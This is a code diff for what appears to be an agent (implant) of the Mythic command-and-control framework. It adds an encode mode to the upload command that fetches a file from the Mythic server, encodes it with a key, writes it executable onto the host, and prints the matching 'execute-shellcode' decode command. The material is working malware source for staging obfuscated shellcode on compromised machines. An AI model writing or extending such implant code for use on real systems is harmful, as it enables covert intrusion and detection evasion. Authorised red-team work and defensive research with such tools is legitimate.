@@ -28,7 +28,8 @@ type UploadArgs struct {
 	FileID     string `json:"file_id"`
 	RemotePath string `json:"remote_path"`
 	Overwrite  bool   `json:"overwrite"`
-	Decompress bool   `json:"decompress"` // Auto-decompress gzip files after transfer
+	Decompress bool   `json:"decompress"`
+	Encode     string `json:"encode"`
 }
 
 // Execute executes the upload command
@@ -50,6 +51,16 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 	fullPath, err := filepath.Abs(fixedFilePath)
 	if err != nil {
 		return errorf("Failed to resolve absolute path for %s: %v", fixedFilePath, err)
+	}
+
+	encoding := args.Encode
+	if encoding == "none" {
+		encoding = ""
+	}
+
+	// Encode mode: accumulate all data, encode, write once
+	if encoding != "" {
+		return c.executeEncoded(task, fullPath, args, encoding)
 	}
 
 	// For decompress mode, write to a temp path first, then decompress to final path
@@ -164,4 +175,52 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 		output += fmt.Sprintf("\nSHA256 (transferred portion): %s", tfResult.SHA256)
 	}
 	return successResult(output)
+}
+
+func (c *UploadCommand) executeEncoded(task structs.Task, fullPath string, args UploadArgs, encoding string) structs.CommandResult {
+	_, err := os.Stat(fullPath)
+	if err == nil && !args.Overwrite {
+		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
+	}
+
+	r := structs.GetFileFromMythicStruct{}
+	r.FileID = args.FileID
+	r.FullPath = fullPath
+	r.Task = &task
+	r.SendUserStatusUpdates = true
+	r.TransferResult = &structs.FileTransferResult{}
+	r.ReceivedChunkChannel = make(chan []byte)
+	task.Job.GetFileFromMythic <- r
+
+	var allData []byte
+	for {
+		chunk := <-r.ReceivedChunkChannel
+		if len(chunk) == 0 {
+			break
+		}
+		allData = append(allData, chunk...)
+	}
+
+	if task.DidStop() {
+		return errorResult("Task stopped early")
+	}
+
+	originalSize := len(allData)
+	encoded, keyHex, encErr := encodeData(allData, encoding)
+	for i := range allData {
+		allData[i] = 0
+	}
+	if encErr != nil {
+		return errorf("Encoding failed: %v", encErr)
+	}
+
+	if writeErr := os.WriteFile(fullPath, encoded, 0700); writeErr != nil {
+		return errorf("Failed to write encoded file to %s: %v", fullPath, writeErr)
+	}
+
+	return successf("Uploaded and encoded %s to %s\nOriginal: %s → Encoded: %s\nEncoding: %s\nKey: %s\nDecode: execute-shellcode -encoding %s -key %s",
+		encoding, fullPath,
+		formatFileSize(int64(originalSize)),
+		formatFileSize(int64(len(encoded))),
+		encoding, keyHex, encoding, keyHex)
 }
